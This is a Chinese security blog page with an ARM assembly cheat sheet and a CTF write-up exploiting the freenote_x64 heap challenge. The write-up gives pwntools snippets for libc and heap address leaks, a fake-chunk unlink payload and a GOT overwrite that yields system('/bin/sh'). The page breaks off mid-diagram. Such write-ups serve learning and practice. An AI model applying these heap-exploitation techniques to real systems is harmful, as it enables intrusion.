<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/12/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/12/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/05/30/ARM%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/05/30/ARM%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">ARM基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-05-30 08:49:12" itemprop="dateCreated datePublished" datetime="2016-05-30T08:49:12+08:00">2016-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Register</strong><br>from <code>r0</code> to <code>r15</code><br><code>r0</code> is used as a return value of functions<br><code>r11</code> is used like <strong>EBP</strong> (called FP)<br><code>r12</code> intra-procedure-call scratch register (called IP)<br><code>r13</code> is used like <strong>ESP</strong> (called SP)<br><code>r14</code> is Link-Register (called LR)<br><code>r15</code> is used like <strong>EIP</strong> (called PC)<br>all register are completely general, you can set a value to <code>r15</code> directly<br><code>ldr r1, [pc]</code> ;(pc point to ‘.long 0x00001337’)<br><code>b go_next</code><br><code>.long 0x00001337</code>  </p>
<p><code>r1</code> register will have <code>0x1337</code><br>ARM中的三级流水线，当前指令在执行，下一条在译码，再下一条正在读取<br><strong>参数传递</strong><br>ARM中的函数参数是通过r0~r3进行传递的，参数超过4个时，超出的部分会通过栈来传递。<br><strong>mov</strong><br><code>mov r1, r2</code> ;r1=r2<br><code>mov r1, #0x80</code> ;r1 = 0x80<br><strong>push</strong><br><code>push 0x10</code> ;push 0x10 onto stack<br><code>push &#123;r1&#125;</code> ;push r1 register onto stack<br><code>push &#123;r11, lr&#125;</code> ;push from right to left (push lr, push r11)<br><code>push &#123;r1-r5&#125;</code> ;push r1,r2,r3,r4 and r5 onto stack<br><strong>pop</strong><br><code>pop &#123;r11, pc&#125;</code> ;pop r11, pop pc<br><strong>ldr</strong><br>ldr{type}{cond} Rd, label<br><code>ldr r1, [r2]</code> ;r1 = *r2<br><code>ldr r1, [r2, #0x10]</code> ;r1 = *(r2+0x10)<br>type指明操作数的位数：  </p>
<table>
<thead>
<tr>
<th align="center">type</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">B</td>
<td align="center">无符号字节 8位</td>
</tr>
<tr>
<td align="center">SB</td>
<td align="center">有符号字节 8位</td>
</tr>
<tr>
<td align="center">H</td>
<td align="center">无符号半字 16位</td>
</tr>
<tr>
<td align="center">SH</td>
<td align="center">有符号半字 16位</td>
</tr>
</tbody></table>
<p>字是32位，不需要指定type。加载数据时会根据有/无符号，将数据符号/零扩展为32位。<br><strong>str</strong><br><code>str r1, [r2]</code> ;*r2 = r1<br><code>str r1, [r2, #0x1]</code> ;*(r2+1)=r1<br><strong>b/bl</strong><br><code>b 0x8080</code> ;jump to 0x8080<br><code>bl 0x8080</code> ;jump to 0x8080 and save next instruction address of current into <code>lr</code> register<br><strong>bx/blx</strong><br>bx{cond} Rm<br>带状态切换的跳转指令，操作数为寄存器。满足条件cond，处理器判断Rm的最低位如果为1，则跳转时自动将CPSR寄存器的标志T置位，并将目标地址的代码解释为Thumb代码；如果Rm的最低位为0，则跳转时自动将CPSR寄存器的标志T复位，并将目标地址的代码解释为ARM。<br><strong>add</strong><br><code>add r1, r2</code> ;r1 = r1 + r2<br><code>add r1, #0x10</code> ;r1 = r1 + 0x10<br><code>add r1, r2, r3</code> ;r1 = r2 + r3<br><code>add r1, r2, #0x10</code> ;r1 = r2 + 0x10<br><strong>sub</strong><br><code>sub r1, r2</code> ;r1 = r1 - r2<br><strong>cmp</strong><br><code>cmp r1, r2</code> ;r1 - r2<br><strong>系统调用</strong><br>1.svc<br><code>svc #0x900004</code> ;calling sys_write<br>2.swi<br><code>mov r7, #4</code> ; write syscall<br><code>swi 0</code> ; execute syscall<br>这两个是一样的</p>
<p><strong>lsls</strong><br>Logical shift left<br>lsls r2, r2, #1 ;r2 = r2 &lt;&lt; 1  </p>
<p>system call <code>/usr/include/arm-linux-gnueabihf/asm/unistd.h</code><br><code>(__lib_start_main)(int (*main)(int , char **, char **))</code><br><strong>eor</strong><br><code>eor r0, r0</code> ;异或  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">freenote_x64堆漏洞double free利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-05-26 15:42:13" itemprop="dateCreated datePublished" datetime="2016-05-26T15:42:13+08:00">2016-05-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>漏洞程序<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1nuGARAp">freenote_x64</a>下载<br>运行程序，这是一个note笔记本程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  .&#x2F;freenote_x64</span><br><span class="line">&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
<p>new_note和delete_note通过<code>malloc()</code>和<code>free()</code>来管理内存。<br>这个程序有两个漏洞，一个是建立新note的时候在note的结尾处没有加<code>\0</code>因此会造成堆或者栈的地址泄露，另一个问题就是在delete note的时候，并不会检测这个note是不是已经被删除过了，因此可以删除一个note两遍，造成double free。</p>
<h3 id="泄露libc在内存中的地址"><a href="#泄露libc在内存中的地址" class="headerlink" title="泄露libc在内存中的地址"></a>泄露libc在内存中的地址</h3><p>因为note的结尾没有<code>\0</code>，因此在输出时会把后面的内容打印出来。因为freelist的头部保存在了libc的.bss段，因此我们可以通过新建两个note(必须两个，若只有一个，删除后没有fd，bk)再删除一个note，然后再建立一个新note的方法来泄露出libc在内存中的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span> * notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span> * notelen)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;\xb8&quot;</span>)</span><br><span class="line"><span class="comment"># 泄露libc的.bss段地址</span></span><br><span class="line">list_note()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0. &quot;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">leaklibcaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leaklibcaddr)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># freelist保存在libc的.bss段，0x3be7b8是freelist地址与libc起始地址之间的固定偏移（同一程序在不同机器上一样，不同程序不同，可由本地调试得知）</span></span><br><span class="line">libc_base_addr = leaklibcaddr - <span class="number">0x3be7b8</span></span><br><span class="line"><span class="comment"># 0x46640是system在libc.so中的偏移</span></span><br><span class="line">system_sh_addr = libc_base_addr + <span class="number">0x46640</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_sh_addr: &quot;</span> + <span class="built_in">hex</span>(system_sh_addr)</span><br><span class="line"><span class="comment"># 0x17ccdb是&quot;/bin/sh&quot;在libc.so中的偏移</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">binsh_addr = libc_base_addr + <span class="number">0x17ccdb</span></span><br></pre></td></tr></table></figure>
<p>note_table的指针在<code>.bss</code>段的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A8 note_table_ptr      dq ?</span><br></pre></td></tr></table></figure>
<p>用gdb attach到freenote_x64的进程上，查看指针值即为note_table的地址，查看note_table内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;x 0x6020A8</span><br><span class="line">0x6020a8:	0x0000000002328010 ; note_table address</span><br><span class="line"></span><br><span class="line">gdb-peda$ x&#x2F;8x 0x2328010</span><br><span class="line">0x2328010:	0x0000000000000100	0x0000000000000002</span><br><span class="line">0x2328020:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x2328030:	0x0000000002329830	0x0000000000000001</span><br><span class="line">0x2328040:	0x0000000000000080	0x00000000023298c0</span><br></pre></td></tr></table></figure>
<p>note_table的结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">head            chunk0                      chunk1</span><br><span class="line">|                 |                           |</span><br><span class="line">+--------+--------+--------+--------+---------+-</span><br><span class="line">| total  | in_use | in_use | note   | note    |</span><br><span class="line">| number | number |        | length | address | ...</span><br><span class="line">| 0x100  |        |        |        |         |</span><br><span class="line">+--------+--------+--------+--------+---------+-</span><br></pre></td></tr></table></figure>
<p>这时note_table中有2条note，地址分别为0x2329830和0x23298c0。<br>删除note0后，查看note_table里的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;8x 0x2328010</span><br><span class="line">0x2328010:	0x0000000000000100	0x0000000000000001</span><br><span class="line">0x2328020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2328030:	0x0000000002329830	0x0000000000000001</span><br><span class="line">0x2328040:	0x0000000000000080	0x00000000023298c0</span><br></pre></td></tr></table></figure>
<p>查看note0地址里的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;4x 0x2329830</span><br><span class="line">0x2329830:	0x00007ff508b507b8	0x00007ff508b507b8</span><br><span class="line">0x2329840:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>
<p>fd为0x00007ff508b507b8，bk为0x00007ff508b507b8<br>新建一个内容为<code>&quot;\xb8&quot;</code>的note，打印内容就能泄露出fd的值。由fd的值计算出libc在内存的基址，从而算出<code>system()</code>和<code>&quot;/bin/sh&quot;</code>的实际地址。<br><code>system()</code>和<code>&quot;/bin/sh&quot;</code>在libc中的偏移可以如下得出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.19.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>或者手工：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nm -D libc-2.19.so | grep system</span><br></pre></td></tr></table></figure>

<h3 id="泄露出heap在内存中的地址"><a href="#泄露出heap在内存中的地址" class="headerlink" title="泄露出heap在内存中的地址"></a>泄露出heap在内存中的地址</h3><p>如果让某个非使用中chunk的fd指向另一个chunk，并且让note的内容刚好接上，就可以把chunk在堆上的位置给泄露出来。这样我们就能得到堆（note_table）的基址:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;C&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;D&quot;</span>*notelen)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">list_note()</span><br><span class="line">p.recvuntil(<span class="string">&quot;0. AAAAAAAA&quot;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">leakheapaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leakheapaddr)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>删除note2和note0后freelist的结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">freelist     note0空闲块   note2空闲块</span><br><span class="line">|             |            |</span><br><span class="line">+------+      +------+     +------+</span><br><span class="line">|      | --&gt;  |   fd |--&gt;  |   fd |</span><br><span class="line">|      |   &lt;--| bk   |  &lt;--| bk   |</span><br><span class="line">+------+      +------+     +------+</span><br><span class="line">| .... |</span><br></pre></td></tr></table></figure>
<p>freelist是从头进，从尾出(FIFO)。先删除note2，note2加入list，再删除note0，note0从头加入。再新建一个内容为”AAAAAAAA”的note，会先使用note2空闲块，因此看一下note2的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;4x 0x2329950</span><br><span class="line">0x2329950:	0x00007ff508b507b8	0x0000000002329820</span><br><span class="line">0x2329960:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>新建note后，”AAAAAAAA”覆盖了0x00007ff508b507b8，正好接到0x0000000002329820（note0地址），使用list_note就能泄露出note0的地址，note0的地址减去0x1810就是note_table的地址。</p>
<h3 id="使用double-free的漏洞触发unlink"><a href="#使用double-free的漏洞触发unlink" class="headerlink" title="使用double free的漏洞触发unlink"></a>使用double free的漏洞触发unlink</h3><p>将note0的地址指向note_table的地址。随后我们就可以通过编辑note0来编辑note_table了。通过编辑note_table我们把note0指向<code>free()</code>函数在got表中的地址，把note1指向<code>&quot;/bin/sh&quot;</code>在内存中的地址。然后我们编辑note0把free()函数在got表中的地址改为<code>system()</code>的地址。最后我们执行delete note1操作。因为我们把note1的地址指向了<code>&quot;/bin/sh&quot;</code>，所以程序会执行system(“/bin/sh”)，最终达到了我们的目的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">notelen = <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">&quot;A&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;B&quot;</span>*notelen)</span><br><span class="line">new_note(<span class="string">&quot;C&quot;</span>*notelen)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># note_table_address = note0-&gt;address - 0x1810</span></span><br><span class="line"><span class="comment"># note0-&gt;pos = note_table_address + 0x20</span></span><br><span class="line"><span class="comment"># fd = note0-&gt;pos - 0x18</span></span><br><span class="line">fd = leakheapaddr - <span class="number">0x1810</span> + <span class="number">0x20</span> - <span class="number">0x18</span> </span><br><span class="line"><span class="comment"># bk = note0-&gt;pos - 0x10</span></span><br><span class="line">bk = fd + <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
<p>对应的堆结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-note0</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note1</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note2</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
<p>fd指向note0在note_table中的位置减0x18，bk指向note0在note_table中的位置减0x10</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># fake_prevsize + fake_size + fake_fd + fake_bk + data</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(notelen+<span class="number">1</span>) + p64(fd) + p64(bk) + <span class="string">&quot;A&quot;</span> * (notelen - <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># fake_prevsize + size + data</span></span><br><span class="line">payload += p64(notelen) + p64(notelen+<span class="number">0x10</span>) + <span class="string">&quot;A&quot;</span> * notelen</span><br><span class="line"><span class="comment"># prevsize + size + data</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(notelen+<span class="number">0x11</span>)+ <span class="string">&quot;\x00&quot;</span> * (notelen<span class="number">-0x20</span>)</span><br><span class="line"></span><br><span class="line">new_note(payload)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>对应的堆结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-note0</span><br><span class="line">| prev_size |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">| fake_prev |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_size |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_fd   |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_bk   |</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note1</span><br><span class="line">| fake_prev |</span><br><span class="line">+-----------+</span><br><span class="line">| fake_size |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    |</span><br><span class="line">+-----------+-note2</span><br><span class="line">|     0     |</span><br><span class="line">+-----------+</span><br><span class="line">| size&amp;Flag |</span><br><span class="line">+-----------+-malloc返回的ptr</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">|   data    